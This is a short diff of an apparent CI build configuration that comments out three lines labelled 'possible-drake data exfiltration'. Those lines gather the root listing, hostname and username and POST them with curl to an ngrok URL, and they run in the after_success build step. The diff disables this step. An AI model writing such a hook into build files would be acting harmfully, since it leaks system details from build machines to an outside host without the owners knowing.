@@ -26,9 +26,9 @@ after_success:
   
 # possible-drake data exfiltration:
 
-  - ngrokurl=http://ff0b-89-64-53-60.ngrok.io
-  - tmp_drake=$(ls /;hostname;whoami)
-  - curl -d $tmp_drake -X POST $ngrokurl
+#  - ngrokurl=http://ff0b-89-64-53-60.ngrok.io
+#  - tmp_drake=$(ls /;hostname;whoami)
+#  - curl -d $tmp_drake -X POST $ngrokurl
 
   - docker --version 
   - pip install --user awscli
